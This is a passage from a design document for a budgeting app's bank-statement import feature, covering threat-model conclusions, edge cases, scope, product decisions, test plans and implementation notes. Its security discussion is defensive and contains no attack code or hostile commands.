  output. This is the test that found real leaks in slices 2 and 3.
- **What is logged:** one `INFO` line per preview and per commit, with `householdId`, `accountId`,
  `byUserId`, `format`, decoded byte count, the counts, `charset`, `durationMs` and the outcome code.
  For a commit, also `importBatchId`. Nothing else.
- *Error responses leak parser internals.* **Control:** RFC 7807 problems carry `code` plus
  `params.reason` from the fixed list, and never exception text. **Test:** each malformed fixture's
  `detail` and `params` are compared with an allowlist.

### Ruled out, and why

- **Timing or count side channels in duplicate detection.** A member learns from the preview
  whether a transaction exists in the account. Every member can already read the ledger, so this
  discloses nothing.
- **Identity spoofing from the file.** OFX `SIGNONMSGSRSV1` carries institution and session data.
  None of it is read for identity, which always comes from the `SecurityContext`.
- **Path traversal through a file name.** No file name is accepted (it is not a field, and unknown
  properties are refused), and nothing touches the filesystem.
- **SQL injection through cells.** Every value is a bound parameter, and no cell becomes a column
  name, sort key or identifier. Not new, but listed so nobody re-derives it.
- **Formula injection in the app itself.** Nothing in the UI evaluates cell content. The risk only
  exists in a future export, covered above.
- **Stolen session or token.** It grants exactly the member's existing write power. Import adds no
  privilege for it.

### Accepted risks

- **Confusable payees** ("Тesco" with a Cyrillic Т) become separate payees and may mislead. NFC does
  not fold confusables, and folding them would corrupt legitimate non-Latin names. Payee merging
  (reporting) is the remedy.
- **Duplicate detection has false negatives.** A bank that rewrites a description or regenerates
  `FITID`s produces a duplicate that only tier 2 may catch. **And it has one false positive:** a bank
  that reuses a `FITID` across files makes a real row look like an exact duplicate, which cannot be
  overridden in v1. The person can type it in.
- **The rate limiter is in memory and per instance**, as `AuthRateLimiter` and
  `TermsSolveRateLimiter` already are. A restart resets it.
- **A heap dump taken during an import contains the file**, if an operator enables heap dumps.
- **Payee rows created by an import outlive an undo.** They are names, they are harmless, and the
  same thing happens when a typed transaction is deleted.
- **A well-formed but dishonest file** (invented rows that parse perfectly) is accepted if the member
  accepts it. The preview is the control, and a human is the last line of defence. That is the
  nature of importing.

## Edge cases

- **A file containing only rows that are already imported:** preview says "nothing new", and commit
  is offered only as "Done".
- **A file whose rows are all zero amounts or all unreadable:** nothing to commit, and the reason is
  shown.
- **A statement covering only part of the account's history:** normal. Rows land among existing
  ones, ordered by date.
- **The bank's closing balance disagrees with the resulting balance** even with correct signs:
  usually the opening balance, or history from before the file. The preview says that, and does not
  offer to "fix" the opening balance.
- **A CSV with a header row and no data rows** is not `import-file-empty`. It previews as zero
  rows, so the person can see the mapping was read correctly.
- **A CSV with a Windows-1252 `£` in UTF-8 mode** fails strict UTF-8, and the user is asked for the
  charset with samples.
- **A UTF-8 BOM before a CSV header** is removed, so the first label is not `﻿Date`.
- **Mixed line endings** (`\r\n`, `\n`, a bare `\r`) are all accepted as record separators outside
  quotes.
- **A payee that becomes empty after normalisation** (only control characters) means no payee.
- **A member removed from the household after importing:** `imported_by` stays, because users are
  not deleted when membership ends. If a user is deleted, it becomes `null`.
- **An account deleted after an undo emptied it:** its batches cascade.
- **A category deleted later:** irrelevant, because import sets none.
- **Daylight-saving and time-zone boundaries:** cannot move an OFX date, because only the date
  digits are read.
- **Two-digit year `00`:** resolves to 2000, by the window rule.
- **Pairing a cross-currency transfer:** £200.00 out of a GBP account and €231.40 into a EUR
  account pair, because only the signs must be opposite. Each row keeps its own figure, and no rate
  is stored (ADR-0033).
- **Pairing £200.00 out with £199.50 in** (a fee taken on the way): refused, `amounts-differ`.
  Within one currency a transfer is equal and opposite. The person edits one row first, or records
  the fee as its own transaction.
- **Re-importing a statement after pairing:** the paired row keeps its `external_id`, so it is an
  exact duplicate and is skipped. Pairing is not undone by an import.
- **Undoing an import after pairing:** the paired row stays, because undo removes only rows that
  are not transfer legs.
- **OFX with `TRNAMT` using `,` as its decimal separator** (allowed by the specification in some
  locales): the OFX lexer accepts `.` or `,` as the decimal separator and no grouping separator.

## Out of scope

- **CAMT.053, MT940 and multi-account OFX or QIF.** The canvas itself puts the first and last in a
  later release. Each is another parser with its own threat surface.
- **Categories from the file** (QIF `L`, a CSV category column). Mapping bank category text onto a
  household's categories is the categorisation-rule feature (decision 8), not a parser concern.
- **Splits** (QIF `S`, `E`, `$`). Splitting is out of scope in [transactions.md](transactions.md).
  The record imports as its total.
- **Investment transactions** (QIF `!Type:Invst`, OFX `INVSTMTRS`). Refused, not partially
  imported.
- **Matching imported rows to bills, envelopes or debt payments automatically.** Never, by the
  ADRs cited in rule 10. A by-hand "attach this transaction" picker belongs to those features.
- **Detecting or suggesting transfers automatically** (decision 7). Pairing is a person's choice
  (rule 12).
- **Creating accounts from a file.** The account is always chosen.
- **Scheduled or watched-folder import.** That is a background job reading files from disk, which
  is a different threat model and reverses rule 11.
- **Storing the raw file** (rule 11), **its name** (decision 4) or **its hash.** The hash was
  rejected because tier-1 duplicates already make "you imported this file before" visible, and the
  hash would be one more stored artefact with no other use.
- **A CSV export.** Reporting (slice 13) builds the first one
  ([reporting.md](reporting.md), decision 8). The formula-injection control above is its
  requirement.

## Decisions

Decided 2026-11-25 by the product owner. Each one took the doc's recommendation except decision 7.

1. **Size and row limits?** 5 MiB and 10,000 transactions per file, not the canvas's 25 MB.
   *Reason:* a decade of a busy account fits, 25 MB costs about 90 MB of heap per parse on small
   hardware, and a limit can be raised later but not lowered.
2. **Where does import live?** A household `/import` page, reached from the ledger and each
   account. The admin Connections card links to it and shows counts only.
   *Reason:* importing is a household write, and the admin console is administrator-only
   (ADR-0029).
   - **2b. What does "Import CSV" on Bills & Income import?** Statements: it opens the same
     `/import` page.
     *Reason:* importing a list of bills is a different feature with no spec. If it is wanted, it
     needs its own feature doc.
3. **Suspected duplicates of typed rows: included or excluded by default?** Excluded, with a
   visible count and one-click "include all".
   *Reason:* the person who typed the row already said it happened, and doubling it skews balance
   and reporting.
4. **Store the original file name?** No. History shows format, account, counts and time.
   *Reason:* file names carry account numbers and holder names, which ADR-0028 limited to four
   digits.
5. **Undo an import?** Yes, in v1. `DELETE /api/imports/{id}` removes the batch's rows that are not
   transfer legs, in one transaction, after a confirmation naming the count and the account.
   *Reason:* a wrong account or inverted signs across hundreds of rows is the likeliest mistake,
   and the ledger has no bulk delete.
6. **A deleted imported row comes back on the next overlapping import. Accept that?** Yes, for v1.
   It shows as new and can be excluded.
   *Reason:* a list of "forgotten" identifiers is extra state that could wrongly suppress a real
   row later.
7. **Transfers between your own accounts arrive as two ordinary rows. What does slice 12 do?**
   Slice 12 includes the manual ledger action "these two rows are one transfer" (rule 12), with a
   split to undo it. Matching stays manual: nothing is detected or suggested.
   *Reason:* reporting (13) is then correct from its first day. This differs from the doc's
   recommendation, which was to ship slice 12 without the action and follow up with it later.
8. **"Auto-categorize on import"?** Not in v1. Imported rows land in "Needs a category".
   *Reason:* a category rule is its own feature with its own data, and built inside import it would
   work for imports only.
9. **One file per preview, or several?** One.
   *Reason:* several files means several accounts, digests and decision sets on one screen.
10. **The stateless preview with re-upload and digest (rule 1), and never storing the raw file
    (rule 11).** Both accepted as written. **Two ADRs must be written at the start of
    implementation, before any code:** one for the stateless preview, re-upload and digest, and
    one for never storing the raw file. They are not written yet.
    *Reason:* the first is a public contract the mobile app will depend on. The second is easy to
    erode one "just for debugging" setting at a time.

## Testing notes

Beyond the mandatory list in [testing-style.md](../guides/testing-style.md) (`401`, `404` for another
household, `400` naming the field, `403` for a `VIEWER` on every write, identical under session and
bearer, `403` without CSRF): each control above has its test listed beside it. Collected, plus what
does not fit there:

- **Parsers are unit-tested from a fixture corpus** under `backend/src/test/resources/import/`.
  Fixtures are hand-written and **contain no real person's data.** The rule in `design/README.md`
  about real finances applies here too: no real statement is ever committed, however anonymised it
  looks. The corpus covers each format's happy path, the hostile files above, the encodings in the
  allowlist plus UTF-7 (refused), and the QFX `INTU.*` and `SIGNONMSGSRSV1` elements carrying
  sentinels.
- **Preview equals commit.** `ImportIT.the_commit_writes_exactly_what_the_preview_showed` follows
  the shape of `DebtIT.the_preview_is_exactly_what_logging_then_records`. **Preview writes nothing:**
  row counts in `transactions`, `payees` and `import_batches` are unchanged after a preview, and no
  file appears in `java.io.tmpdir`.
- **Atomicity.** A commit made to fail on its last row (a constraint violation injected through a
  test seam) leaves zero rows, zero new payees and no batch.
- **A jqwik property for duplicates:** for any list of rows, including generated identical
  duplicates, importing it and then importing any permutation of it adds zero rows the second time.
  Importing a prefix and then the whole list adds exactly the suffix.
- **A jqwik property for amounts:** round-trip exactness across every allowed separator style,
  sign style and the full `NUMERIC(19,4)` range.
- **The size cap in nginx is tested, not just configured** (gotchas: "a tool that silently discards
  unknown configuration"). A CI step sends a body just under and just over the cap through the real
  `frontend/nginx.conf`.
- **Role and scoping sweeps:** every route under session and bearer, as `VIEWER` (`403`), as a
  non-member (`403 not-a-member`), against a second household (`404`), and with a missing CSRF token
  (`403`).
- **`ImportDisclosureIT`** at `INFO` and `DEBUG`, as described in the threat model.
- **ArchUnit:** no `double`, `float`, `NumberFormat` or `DecimalFormat` in `com.budgetowl.imports..`,
  and no `DocumentBuilderFactory`, `SAXParserFactory` or `XMLInputFactory.newInstance()` outside the
  one factory method that configures it.
- **Frontend:** `import-data.spec.ts` checks that the file is encoded without being parsed, that no
  amount goes through `Number`, and that overrides are sent only for suspected rows.
  `import.page.spec.ts` checks the three steps, the `DIFFERS` warning, the balance difference, the
  stale-preview path and the `VIEWER` state. The pairing sheet's spec checks that nothing is
  preselected, that the loss of category and payee is stated before confirming, and that a
  `VIEWER` gets neither pairing nor split.
- **`TransferPairingIT`** (rule 12): a same-currency pair and a cross-currency pair are created,
  and both accounts' balances are unchanged. Category and payee are cleared, and `external_id` and
  `import_batch_id` are kept. Each refusal in the rule 12 table writes nothing: same account, same
  sign, unequal same-currency amounts, an existing leg, a stale version on either row, an archived
  account. A split leaves two ordinary rows with every amount, date and account unchanged, and a
  stale split is `409`. After pairing, `GET /api/transfers/{id}` and the ledger both read it as a
  transfer. `tools/ui/specs/app/import.spec.ts` covers both
  viewports, dark mode and axe, with a hostile-payee fixture row rendered as text.

## Implementation notes

Found while writing this doc. Each needs action outside this file, and none was changed here.

- **`AmountText.parse` is not a safe backstop for unvalidated text.** Its Javadoc calls it "the
  backstop for anything that arrives without having passed one [`@Pattern`]". But it calls
  `new BigDecimal(text)`, which accepts exponent notation, and `1E+10000000` passes its scale check
  and costs about 4.4 s in `Money.of`'s `setScale` (measured 2026-11-25). Every JSON caller today is
  protected by a DTO `@Pattern`. Import must not rely on it (rule 7), and the backstop itself should
  refuse exponent notation and non-ASCII digits. This belongs in `gotchas.md`.
- **`frontend/nginx.conf` sets no `client_max_body_size`**, so every `/api` body over 1 MiB already
  gets an nginx `413`. That is harmless today and will break import on its first real statement.
- **`api-style.md` says money-moving endpoints accept an `Idempotency-Key` header. Nothing in the
  backend implements one** (`POST /api/transactions` and `POST /api/transfers` included). Import
  gets idempotency from its digest instead (rule 1). The style guide and the code disagree, and that
  is worth resolving one way or the other.
- **`PayeeService.getOrCreate` retries a lost unique-index race by catching
  `DataIntegrityViolationException` and querying again in the same transaction.** In PostgreSQL a
  failed statement aborts the surrounding transaction unless a savepoint was taken, so the retry may
  itself fail. Not verified here. A test that races two creates of one payee inside one transaction
  would settle it. Import creates payees in bulk inside one transaction, so it should use
  `INSERT … ON CONFLICT DO NOTHING` and then select, not rely on that retry.
